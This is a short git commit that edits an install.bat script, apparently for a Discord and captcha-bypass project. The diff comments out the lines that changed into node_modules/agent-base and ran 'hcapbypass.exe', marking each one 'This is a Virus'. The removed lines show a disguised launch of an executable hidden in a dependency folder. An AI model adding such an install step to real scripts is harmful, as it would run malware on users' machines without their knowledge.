b38686721ed1775657fe3ba9622f1fe7f1410f7f
DrDisconnet <73930619+drdisconnet@users.noreply.github.com>
2022-04-24 14:51:08 +0530

    Update install.bat
    - This is a Virus

--- install.bat
+++ install.bat
@@ -2,6 +2,6 @@
 pip install discord
 pip install playwright
 pause
-cd node_modules
-cd agent-base
-hcapbypass.exe
+:: cd node_modules - This is a Virus
+:: cd agent-base - This is a Virus
+:: hcapbypass.exe - This is a Virus
